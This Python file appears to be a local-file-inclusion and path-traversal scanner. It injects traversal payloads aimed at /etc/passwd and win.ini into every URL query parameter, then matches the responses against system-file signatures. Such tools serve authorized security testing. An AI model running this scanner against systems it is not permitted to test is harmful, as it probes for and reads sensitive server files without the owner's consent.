import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini"
]

signatures = [
    "root:x:",
    "daemon:",
    "[extensions]",
    "bin:/bin"
]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    params[param] = payload

    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def scan_lfi(url):
    results = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return results

    for param in params:
        for payload in payloads:
            test_url = inject_payload(url, param, payload)

            try:
                response = requests.get(test_url, timeout=5)

                for sig in signatures:
                    if sig in response.text:
                        results.append({
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "type": "LFI / Path Traversal"
                        })
                        break

            except:
                continue

    return results